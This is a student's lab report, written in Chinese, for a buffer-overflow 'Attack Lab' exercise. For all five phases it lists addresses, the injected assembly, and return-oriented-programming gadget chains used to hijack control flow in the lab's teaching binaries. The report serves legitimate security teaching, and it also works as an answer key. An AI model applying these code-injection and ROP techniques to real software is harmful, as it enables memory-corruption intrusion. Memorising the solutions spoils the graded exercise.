# Attack Lab 实验报告

## 基本信息
- Cookie: 0x1c2a3245
- 缓冲区大小: 24字节 (0x18)
- buf地址: 0x55685ea8

## 关键地址
- touch1: 0x401bf9
- touch2: 0x401c27
- touch3: 0x401d19
- getbuf: 0x401be3

## Phase 1: 代码重定向攻击 (ctarget.l1.txt)
- 目标: 让getbuf返回到touch1
- 方法: 填充24字节后覆盖返回地址为touch1地址
- 结果: ✓ PASS

## Phase 2: 代码注入攻击 (ctarget.l2.txt)
- 目标: 调用touch2(cookie)
- 方法: 注入代码设置%rdi=cookie，然后跳转到touch2
- 注入代码:
  - mov $0x1c2a3245, %rdi
  - push $0x401c27
  - ret

## Phase 3: 代码注入攻击 (ctarget.l3.txt)
- 目标: 调用touch3(cookie_string)
- 方法: 注入代码设置%rdi指向cookie字符串，然后跳转到touch3
- Cookie字符串: "1c2a3245" (ASCII编码)

## Phase 4: ROP攻击 (rtarget.l2.txt)
- 目标: 使用ROP调用touch2(cookie)
- Gadget链:
  1. popq %rax @ 0x401def
  2. cookie值 0x1c2a3245
  3. movq %rax, %rdi @ 0x401de1
  4. touch2地址 0x401c27
- 结果: ✓ PASS

## Phase 5: ROP攻击 (rtarget.l3.txt)
- 目标: 使用ROP调用touch3(cookie_string)
- Gadget链:
  1. movq %rsp, %rax @ 0x401e4f
  2. movq %rax, %rdi @ 0x401de1
  3. popq %rax @ 0x401def
  4. 偏移量 0x48
  5. movl %eax, %edx @ 0x401e63
  6. movl %edx, %ecx @ 0x401e00
  7. movl %ecx, %esi @ 0x401e14
  8. lea (%rdi,%rsi), %rax @ 0x401df9 (add_xy)
  9. movq %rax, %rdi @ 0x401de1
  10. touch3地址 0x401d19
  11. cookie字符串
- 结果: ✓ PASS

## 文件列表
- ctarget.l1.txt: Phase 1攻击字符串
- ctarget.l2.txt: Phase 2攻击字符串
- ctarget.l3.txt: Phase 3攻击字符串
- rtarget.l2.txt: Phase 4攻击字符串
- rtarget.l3.txt: Phase 5攻击字符串
